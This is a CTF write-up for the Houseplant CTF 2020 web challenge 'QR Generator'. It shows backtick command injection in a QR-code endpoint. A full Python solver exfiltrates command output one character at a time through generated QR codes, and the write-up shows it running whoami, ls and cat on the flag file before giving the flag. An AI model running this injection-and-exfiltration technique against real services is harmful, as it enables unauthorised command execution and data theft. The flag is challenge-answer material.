# Houseplant CTF 2020 – QR Generator

* **Category:** web
* **Points:** 50

## Challenge

> I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?
> 
> http://challs.houseplant.riceteacatpanda.wtf:30004
> 
> Dev: jammy
>
> Hint! For some reason, my website isn't too fond of backticks...

## Solution

The hint suggests a RCE.

Analyzing the HTML source code, an interesting comment can be found.

```html
<html>

<head>
  <title>QR Code Generator</title>
  <link rel="stylesheet" href="/stylesheets/style.css">
</head>

<body>
  <h1>QR Generator</h1>
  <p>Generate your QR codes here!</p>
  
  <!-- TODO: Fix bug where the QR code only contains 1 character -->
  <img src />
  <input type="text" placeholder="Enter text here..." />
  <script>
    const input = document.querySelector('input');
    const img = document.querySelector('img');

    ['onkeyup', 'onchange'].forEach(action => {
      input[action] = () => {
        img.src = '/qr?text=' + encodeURIComponent(input.value)
      }
    })
  </script>
</body>
</html>
```

The endpoint of this QR code service is `http://challs.houseplant.riceteacatpanda.wtf:30004/qr`.

The QR code produced contains *only the first char inserted*. Using backticks, you can confirm the RCE. For example, sending `echo 'X'` command will return the QR code of the letter `X`.

```
http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`echo%20%27X%27`
```

![qr-echo-X.png](qr-echo-X.png)

You can write a [Python script](qr-generator-solver.py) to exfiltrate output of executed commands.

```python
#!/usr/bin/python

import requests
import sys
import time
import os
import base64

# pit3 install pillow
# pip3 install pyqrcode
# pip3 install pyzbar

from PIL import Image
from pyzbar.pyzbar import decode

target_url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text={}"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
   "Accept-Encoding": "gzip, deflate",
   "Referer": "http://challs.houseplant.riceteacatpanda.wtf:30004/",
}


def execute_command(command):
    print("cmd > {}".format(command))
    command_output = ""
    i = 1
    finished = False
    while not finished:
        payload = "`{}|base64|cut -c{}`".format(command, i)
        qr_code = http_get(payload)
        qr_code_image_name = "qr.png"
        with open(qr_code_image_name, "wb") as qr_code_image:
            qr_code_image.write(qr_code)
        qr_data = decode(Image.open(qr_code_image_name))[0].data.decode("utf-8")
        if len(qr_data.strip()) > 0:
            command_output += qr_data
        else:
            finished = True
        os.remove(qr_code_image_name)
        i += 1
    print(base64.b64decode(command_output))


def http_get(payload):
    response = None
    response_ok = False
    while not response_ok:
        try:
            target_attacked = target_url.format(payload)
            r = requests.get(target_attacked, headers=headers)
            response = r.content
            if r.status_code == 200:
                response_ok = True
                time.sleep(1)
            else:
                print("   ERROR!")
                time.sleep(10)
            if "PNG" not in r.text:
                raise Exception("PNG not found in response!")
        except:
            print("   EXCEPTION!")
            time.sleep(5 * 60)
    return response


execute_command(sys.argv[1])
```

You can interact launching the remote commands.

```
user@vm:~$ python3 -W ignore qr-generator-solver.py whoami
cmd > whoami
b'rtcp\n'
user@vm:~$ python3 -W ignore qr-generator-solver.py ls
cmd > ls
b'README.md\napp\nflag.txt\nnode_modules\npackage.json\nstart.sh'
user@vm:~$ python3 -W ignore qr-generator-solver.py "cat flag.txt"
cmd > cat flag.txt
b'rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}\n'
```

So the flag is the following.

```
rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}
```